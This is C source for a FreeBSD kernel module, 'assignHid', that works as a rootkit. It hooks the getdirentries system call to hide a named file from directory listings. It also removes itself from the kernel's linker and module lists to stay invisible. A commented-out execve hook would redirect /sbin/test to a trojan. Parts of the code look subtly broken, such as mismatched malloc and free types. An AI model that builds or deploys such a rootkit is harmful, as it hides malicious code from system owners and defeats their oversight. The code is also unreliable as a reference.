#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>
#include <sys/dirent.h>
#include <bsm/audit_kevents.h>
#include <sys/sysproto.h>
#include<sys/types.h>
#include<sys/malloc.h>
//#include<sys/stdio.h>

#define ORIGINAL "/sbin/test"
#define TROJAN "/sbin/trojan_test"
#define T_NAME "assignHid"
#define VERSION "assignHid.ko"
/*
* The following is the list of variables you need to reference in order
* to hide this module, which aren't defined in any header files.
*/
extern linker_file_list_t linker_files;
extern int next_file_id;
typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;
struct module {
    TAILQ_ENTRY(module) link; /* chain together all modules */
    TAILQ_ENTRY(module) flink; /* all modules in a file */
    struct linker_file *file; /* file which contains this module */
    int refs; /* reference count */
    int id; /* unique id number */
    char *name; /* module name */
    modeventhand_t handler; /* event handler */
    void *arg; /* argument for handler */
    modspecific_t data; /* module specific data */
};
/*
* execve system call hook.
* Redirects the execution of ORIGINAL into TROJAN.
*/
//static int
//execve_hook(struct thread *td, void *syscall_args) {
//     return(sys_execve(td, syscall_args));
//}
/*
* getdirentries system call hook.
* Hides the file T_NAME.
*/
static int
getdirentries_hook(struct thread *td, void *syscall_args)
{
    struct getdirentries_args /* {
        int fd;
        char *buf;
        u_int count;
        long *basep;
     } */ *uap;
     uap = (struct getdirentries_args *)syscall_args;
     struct dirent *dp, *current;
     unsigned int size, count;
 /*
 * Store the directory entries found in fd in buf, and record the
 * number of bytes actually transferred.
 */
     sys_getdirentries(td, syscall_args);
     size = td->td_retval[0];
 /* Does fd actually contain any directory entries? */
     if (size > 0) {
         //malloc(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
	 //MALLOC_DECLARE(dirent);
	 dp = malloc(size, 0 ,M_NOWAIT);
         copyin(uap->buf, dp, size);
         current = dp;
         count = size;
 /*
 * Iterate through the directory entries found in fd.
 * Note: The last directory entry always has a record length
 * of zero.
 */
        while ((current->d_reclen != 0) && (count > 0)) {
            count -= current->d_reclen;
 /* Do we want to hide this file? */
            if(strcmp((char *)&(current->d_name), T_NAME) == 0) {
 /*
 * Copy every directory entry found after
 * T_NAME over T_NAME, effectively cutting it
 * out.
 */
                if (count != 0)
                    bcopy((char *)current +current->d_reclen, current,count);
                size -= current->d_reclen;
                break;
            }
 /*
 * Are there still more directory entries to
 * look through?
 */
            if (count != 0)
                current = (struct dirent *)((char *)current + current->d_reclen);
        }
 /*
 * If T_NAME was found in fd, adjust the "return values" to
 * hide it. If T_NAME wasn't found...don't worry 'bout it.
 */
     td->td_retval[0] = size;
     copyout(dp, uap->buf, size);
     free(dp, M_TEMP);
     }
 return(0);
}
/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{
    struct linker_file *lf;
    struct module *mod;
    mtx_lock(&Giant);
/* Decrement the current kernel image's reference count. */
    (&linker_files)->tqh_first->refs--;
/*
* Iterate through the linker_files list, looking for VERSION.
* If found, decrement next_file_id and remove from list.
*/
    TAILQ_FOREACH(lf, &linker_files, link) {
        if (strcmp(lf->filename, VERSION) == 0) {
            next_file_id--;
            TAILQ_REMOVE(&linker_files, lf, link);
            break;
        }
    }
 
    mtx_unlock(&Giant);
    sx_xlock(&modules_sx);
/*
* Iterate through the modules list, looking for "assignHid."
* If found, decrement nextid and remove from list.
*/
    TAILQ_FOREACH(mod, &modules, link) {
        if (strcmp(mod->name, "assignHid") == 0) {
            nextid--;
            TAILQ_REMOVE(&modules, mod, link);
            break;
        }
     }
    sx_xunlock(&modules_sx);
    //sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
    sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
    return(0);
}
static moduledata_t assignHid_mod = {
    "assignHid", /* module name */
    load, /* event handler */
    NULL /* extra data */
};
DECLARE_MODULE(assignHid, assignHid_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
